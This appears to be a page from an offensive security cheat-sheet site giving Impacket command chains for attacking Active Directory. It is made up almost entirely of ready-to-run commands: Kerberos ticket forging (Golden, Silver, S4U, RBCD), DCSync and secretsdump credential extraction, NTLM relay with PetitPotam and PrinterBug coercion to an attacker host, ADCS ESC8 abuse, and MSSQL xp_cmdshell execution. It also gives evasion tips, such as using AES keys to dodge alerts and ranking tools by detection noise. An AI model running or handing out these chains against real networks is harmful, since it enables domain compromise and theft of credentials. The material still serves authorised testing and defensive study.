---
title: "Impacket — Kerberos & Credential Attacks"
description: "Advanced Impacket attacks: Kerberoasting, AS-REP Roasting, Golden/Silver Tickets, RBCD, secretsdump, relay attacks and ADCS."
sidebar:
  order: 4
  label: "Impacket — Attacks & Credentials"
---

> <img src="https://pypi-camo.freetls.fastly.net/652cfe66f331e651740e9712d2b41136e85c4208/68747470733a2f2f6769746875622e636f6d2f757365722d6174746163686d656e74732f6173736574732f31346165643730302d306336652d343836352d616335332d363836623931383734663530" alt="Impacket" style="height: 40px; margin-bottom: 8px;" />
> 
> Advanced attack chains with Impacket: from AS-REP Roasting to Golden Tickets, DCSync, relay attacks and ADCS exploitation. Each technique documented with real commands, requirements and OPSEC profile.
> 
> **Official Repo:** [fortra/impacket](https://github.com/fortra/impacket)

---

## AS-REP Roasting — GetNPUsers.py

Target: accounts with `DONT_REQ_PREAUTH` flag.

```bash
# Without credentials (with username list)
GetNPUsers.py corp.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt -dc-ip 10.0.1.51

# With valid credentials (auto-enumerate)
GetNPUsers.py corp.local/user:password -request -format hashcat -outputfile asrep.txt

# Crack — hashcat mode 18200
hashcat -m 18200 asrep.txt wordlist.txt
```

> **Note:** Can be executed without valid credentials if username list is known.

---

## Kerberoasting — GetUserSPNs.py

Target: service accounts with registered SPNs. Requires any domain user credentials.

```bash
# Enumerate SPNs and request TGS tickets
GetUserSPNs.py corp.local/user:password -dc-ip 10.0.1.51 -request -outputfile kerberoast.txt

# With NTLM hash
GetUserSPNs.py corp.local/user -hashes :<NThash> -dc-ip 10.0.1.51 -request

# Crack
hashcat -m 13100 kerberoast.txt wordlist.txt    # RC4 (etype 23)
hashcat -m 19700 kerberoast.txt wordlist.txt    # AES (etype 17/18)
```

---

## Silver Ticket — ticketer.py

Forges a Service Ticket (TGS) for a specific service. Requires service account NTLM hash or AES key + Domain SID.

```bash
# Forge Silver Ticket for CIFS
ticketer.py -nthash <SERVICE_NTLM_HASH> \
  -domain-sid S-1-5-21-XXXXXXXXXX \
  -domain corp.local \
  -spn cifs/target.corp.local \
  Administrator

# Use the ticket
export KRB5CCNAME=Administrator.ccache
psexec.py corp.local/Administrator@target.corp.local -k -no-pass
```

Does not contact the DC. Limited to the targeted service.

---

## Golden Ticket — ticketer.py

Forges a full TGT. Requires `krbtgt` NTLM hash or AES key + Domain SID.

```bash
# With NTLM
ticketer.py -nthash <KRBTGT_NTLM_HASH> \
  -domain-sid S-1-5-21-XXXXXXXXXX \
  -domain corp.local \
  Administrator

# With AES key (stealthier — avoids encryption downgrade alerts)
ticketer.py -aesKey <KRBTGT_AES256_KEY> \
  -domain-sid S-1-5-21-XXXXXXXXXX \
  -domain corp.local \
  Administrator

# Use for DCSync
export KRB5CCNAME=Administrator.ccache
secretsdump.py corp.local/Administrator@dc01.corp.local -k -no-pass
```

> **Caution:** No AS-REQ generated in DC logs — primary detection signal. Use AES keys to avoid encryption downgrade alerts.

---

## Diamond Ticket (Advanced concept)

Evolution of the Golden Ticket:
1. Requests a legitimate TGT from the DC (generates normal AS-REQ in logs)
2. Decrypts the TGT using the KRBTGT key
3. Modifies the PAC to include elevated privileges
4. Re-encrypts and uses it

Bypasses "missing AS-REQ" detection that catches conventional Golden Tickets. Primary tooling: Rubeus (`diamond` command).

---

## Sapphire Ticket

The stealthiest known Kerberos forgery technique:
1. Obtains a legitimate TGT
2. Uses S4U2Self + User-to-User (U2U) to obtain a real PAC from a high-privileged user
3. Injects that genuine PAC into the ticket

The PAC is genuine — belonged to a real user. No discrepancy between ticket privileges and actual group memberships.

---

## S4U — Delegation Abuse — getST.py

```bash
# Impersonate Administrator on target service
getST.py -spn cifs/target.corp.local \
  -impersonate Administrator \
  -dc-ip 10.0.1.51 \
  corp.local/compromised_svc$:password

# With NTLM hash
getST.py -spn cifs/target.corp.local \
  -impersonate Administrator \
  -hashes :<NThash> \
  corp.local/compromised_svc$

# Use resulting ticket
export KRB5CCNAME=Administrator@cifs_target.corp.local@CORP.LOCAL.ccache
wmiexec.py -k -no-pass corp.local/Administrator@target.corp.local
```

---

## RBCD — Resource-Based Constrained Delegation

Prerequisites: write access (`GenericAll`, `GenericWrite`, `WriteDacl`) over a target computer object.

```bash
# Step 1: Create computer account
addcomputer.py -computer-name 'EVILPC$' \
  -computer-pass 'Password123!' \
  -dc-ip 10.0.1.51 \
  corp.local/user:password

# Step 2: Configure RBCD
rbcd.py -delegate-from 'EVILPC$' \
  -delegate-to 'TARGET$' \
  -action write \
  -dc-ip 10.0.1.51 \
  corp.local/user:password

# Step 3: Get service ticket impersonating Administrator
getST.py -spn cifs/target.corp.local \
  -impersonate Administrator \
  -dc-ip 10.0.1.51 \
  corp.local/EVILPC$:'Password123!'

# Step 4: Use the ticket
export KRB5CCNAME=Administrator@cifs_target.corp.local@CORP.LOCAL.ccache
wmiexec.py -k -no-pass corp.local/Administrator@target.corp.local
```

---

## Unconstrained Delegation

Target: machines with `TRUSTED_FOR_DELEGATION` flag.

```bash
# Check Spooler Service on DC
rpcdump.py corp.local/user:password@dc01.corp.local | grep MS-RPRN

# Trigger PrinterBug
printerbug.py corp.local/user:password@dc01.corp.local attacker_ip
```

Flow: Compromise server with unconstrained delegation → Coerce DC (PrinterBug/PetitPotam) → Capture DC TGT → DCSync.

---

## secretsdump.py — Credential Extraction

### DCSync (DRSUAPI)

Requires "Replicating Directory Changes" + "Replicating Directory Changes All" permissions.

```bash
# Full DCSync
secretsdump.py corp.local/admin:password@dc01.corp.local

# Specific user
secretsdump.py corp.local/admin:password@dc01.corp.local -just-dc-user krbtgt

# NTLM hashes only
secretsdump.py corp.local/admin:password@dc01.corp.local -just-dc-ntlm

# With NTLM hash
secretsdump.py -hashes :<NThash> corp.local/admin@dc01.corp.local

# With Kerberos ticket
export KRB5CCNAME=admin.ccache
secretsdump.py -k -no-pass corp.local/admin@dc01.corp.local

# With password history
secretsdump.py corp.local/admin:password@dc01.corp.local -history
```

### VSS Shadow Copy

```bash
# Force VSS method
secretsdump.py corp.local/admin:password@dc01.corp.local -use-vss

# Specify execution method
secretsdump.py corp.local/admin:password@dc01.corp.local -use-vss -exec-method wmiexec
```

### Offline Extraction

```bash
# From local hives
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL

# From NTDS.dit
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

### Output Format

```
username:RID:LMhash:NThash:::
# Example:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

Files generated with `-outputfile dump`:

| File | Contents |
|------|----------|
| `dump.sam` | Local SAM hashes |
| `dump.ntds` | Domain NTDS.dit hashes |
| `dump.secrets` | LSA secrets (cached creds, service account passwords) |
| `dump.ntds.kerberos` | Kerberos keys (AES256, AES128, DES) |
| `dump.ntds.cleartext` | Cleartext passwords (if reversible encryption enabled) |

Useful flags:

| Flag | Purpose |
|------|---------|
| `-outputfile <base>` | Save with automatic extensions |
| `-just-dc-ntlm` | NTLM hashes only |
| `-just-dc` | NTDS.dit data only |
| `-just-dc-user <user>` | Specific user hash |
| `-history` | Include password history |

Cracking:
```bash
hashcat -m 1000 dump.ntds wordlist.txt
cat dump.ntds | cut -d: -f1,4              # Extract usernames and NT hashes
grep "31d6cfe0d16ae931b73c59d7e0c089c0" dump.ntds   # Empty passwords
```

---

## Relay Attacks — ntlmrelayx.py

Authentication coercion methods:

| Method | Protocol | Description |
|--------|----------|-------------|
| PetitPotam | MS-EFSRPC | Most reliable, works against DCs |
| PrinterBug | MS-RPRN | Requires Print Spooler running |
| mitm6 | IPv6 DNS | DNS poisoning for WPAD/proxy |
| Responder | LLMNR/NBT-NS | Name resolution poisoning |

### SMB Relay

```bash
ntlmrelayx.py -tf targets.txt -smb2support
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"   # Specific command
ntlmrelayx.py -tf targets.txt -smb2support -i             # Interactive shell
```

> **Requirement:** SMB Signing must be disabled on target.

### LDAP Relay

```bash
# Create computer account + RBCD
ntlmrelayx.py -t ldap://dc01.corp.local --delegate-access

# Shadow Credentials
ntlmrelayx.py -t ldap://dc01.corp.local --shadow-credentials

# Escalate user via ACL
ntlmrelayx.py -t ldap://dc01.corp.local --escalate-user attacker_user
```

### ADCS Relay (ESC8)

```bash
# 1. Start ntlmrelayx targeting Web Enrollment
ntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController

# 2. Coerce DC
python3 PetitPotam.py attacker_ip dc01.corp.local

# 3. Use certificate for TGT
gettgtpkinit.py -cert-pfx dc.pfx -dc-ip 10.0.1.51 corp.local/DC$ dc.ccache

# 4. DCSync
export KRB5CCNAME=dc.ccache
secretsdump.py -k -no-pass corp.local/DC$@dc01.corp.local
```

---

## ADCS — Vulnerability Matrix

| ESC | Name | Issue | Impact |
|-----|------|-------|---------|
| ESC1 | SAN Impersonation | Template allows SAN + low-priv enrollment + Client Auth EKU | Domain Admin impersonation |
| ESC2 | Any Purpose EKU | Template with "Any Purpose" EKU or no EKU | Flexible escalation |
| ESC3 | Enrollment Agent | Template with "Certificate Request Agent" EKU | Request certs as other users |
| ESC4 | Template ACL Abuse | Low-priv user can modify template | Modify template → ESC1 |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 | CA flag allows SAN in any request | Any template → ESC1 |
| ESC7 | CA Access Control | "Manage CA" permissions abused | Approve pending requests |
| ESC8 | NTLM Relay to Web Enrollment | HTTP endpoint accepts NTLM without EPA | Relay → Cert → Domain compromise |

Certipy workflow:
```bash
certipy find -u user@corp.local -p password -dc-ip 10.0.1.51 -vulnerable
certipy req -u user@corp.local -p password -ca 'CORP-CA' -template 'VulnTemplate' -upn administrator@corp.local
certipy auth -pfx administrator.pfx -dc-ip 10.0.1.51
```

Impacket + ADCS integration: ntlmrelayx.py for ESC8, results feed Impacket workflows (Certificate → gettgtpkinit.py → TGT → secretsdump.py -k).

---

## MSSQL Exploitation — mssqlclient.py

```bash
# SQL Authentication
mssqlclient.py user:password@mssql.corp.local

# Windows Authentication
mssqlclient.py corp.local/user:password@mssql.corp.local -windows-auth

# Pass-the-Hash
mssqlclient.py corp.local/user@mssql.corp.local -windows-auth -hashes :<NThash>
```

### xp_cmdshell

```
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
SQL> xp_cmdshell dir C:\Users
```

### Linked Servers

```sql
-- Enumerate linked servers
SELECT * FROM sys.servers;

-- Execute on linked server
EXEC ('xp_cmdshell ''whoami''') AT [LinkedServer];

-- Chain multiple links
EXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT [SecondLink]') AT [FirstLink];
```

### NTLM Coercion via MSSQL

```
SQL> xp_dirtree \\attacker_ip\share
```

Forces MSSQL service to authenticate against attacker — capture with Responder/smbserver.py or relay with ntlmrelayx.

---

## Troubleshooting

| Error | Cause | Solution |
|-------|-------|----------|
| `KRB_AP_ERR_SKEW` | Clock differs >5 min from DC | `sudo rdate -n <DC_IP>` |
| `STATUS_ACCESS_DENIED` | Insufficient permissions | Verify local admin group / ACLs |
| `KDC_ERR_S_PRINCIPAL_UNKNOWN` | SPN not found | Use FQDN instead of IP |
| `STATUS_LOGON_FAILURE` | Wrong credentials | Verify username/password |
| `STATUS_ACCOUNT_DISABLED` | Account disabled | Verify status in AD |
| `STATUS_ACCOUNT_LOCKED_OUT` | Too many attempts | Wait or unlock |
| Connection Refused | Port closed/firewall | `nc -zv <IP> 445` |

> **Tip:** Add `-debug` to any command for detailed output. Use `describeTicket.py ticket.ccache` to verify tickets.

---

## OPSEC — Detection Matrix

| Event ID | Source | Detects |
|----------|--------|---------|
| 4624 | Security | Logon events (Type 3 = network) |
| 4662 | Security | Directory Service access (DCSync) |
| 4768 | Security | Kerberos pre-auth (AS-REP Roasting) |
| 4769 | Security | TGS requests (Kerberoasting) |
| 4698 | Security | Scheduled task creation (atexec) |
| 4741 | Security | Computer account creation (RBCD) |
| 5136 | Security | AD object modification (RBCD, Shadow Creds) |
| 7045 | System | Service installation (psexec, smbexec) |
| 4886/4887 | AD CS | Certificate request/issuance |

### Noise Level

| Tool | Noise | Key Indicator |
|------|-------|--------------|
| `psexec.py` | [NOISY] | Event 7045, binary on disk |
| `smbexec.py` | [HIGH] | Temporary service, .bat on disk |
| `wmiexec.py` | [MODERATE] | wmiprvse.exe → cmd.exe |
| `dcomexec.py` | [STEALTHY] | DCOM/RPC traffic |
| `secretsdump.py` (DCSync) | [HIGH] | Event 4662 from non-DC |
| `GetNPUsers.py` | [LOW] | Abnormal Event 4768 |
| `ticketer.py` (Golden) | [LOW*] | No AS-REQ (absence-based detection) |

---

## Related Cheatsheets

- [AD Enumeration & Attacks](/en/metodologias/active-directory/active-directory-enumeration-attacks/) — Kerberoasting with Rubeus, ACL abuse, DCSync with Mimikatz
- [Impacket — Operational Guide](/en/metodologias/active-directory/impacket-guide/) — Installation, authentication, inventory, remote execution
- [Attacking Enterprise Networks](/en/metodologias/active-directory/attacking-enterprise-networks/) — End-to-end flow
